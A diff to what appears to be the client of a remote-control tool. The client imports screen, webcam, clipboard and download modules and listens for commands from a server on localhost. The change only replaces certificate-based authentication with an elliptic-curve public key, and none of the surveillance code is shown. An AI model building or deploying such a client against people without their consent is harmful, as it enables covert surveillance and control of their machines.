@@ -6,7 +6,7 @@ import subprocess
 from contextlib import redirect_stdout, suppress
 from io import StringIO
 
-from cryptography import x509
+from cryptography.hazmat.primitives.asymmetric import ec
 from modules import clipboard, download, screen, webcam, windows
 from utils.baseclient import BaseClient
 
@@ -17,8 +17,8 @@ BLOCK_SIZE = 32768
 class Client(BaseClient):
     """ Client for managing commands """
 
-    def __init__(self, certificate: x509.Certificate) -> None:
-        BaseClient.__init__(self, certificate)
+    def __init__(self, public_key: ec.EllipticCurvePublicKey) -> None:
+        BaseClient.__init__(self, public_key)
 
     def listen(self) -> None:
         """ Listen for coming commands """
@@ -238,12 +238,14 @@ class Client(BaseClient):
 
 if __name__ == '__main__':
 
+    from cryptography.hazmat.primitives import serialization
+
     # Read certificate from file
-    with open('cert.pem', 'rb') as cert_file:
-        cert = x509.load_pem_x509_certificate(cert_file.read())
+    with open('public.pem', 'rb') as cert_file:
+        pubkey = serialization.load_pem_public_key(cert_file.read())
 
     # Connect to server
-    client = Client(cert)
+    client = Client(pubkey)
     client.connect(('localhost', 6969))
 
     # Listen to commands indefinitely
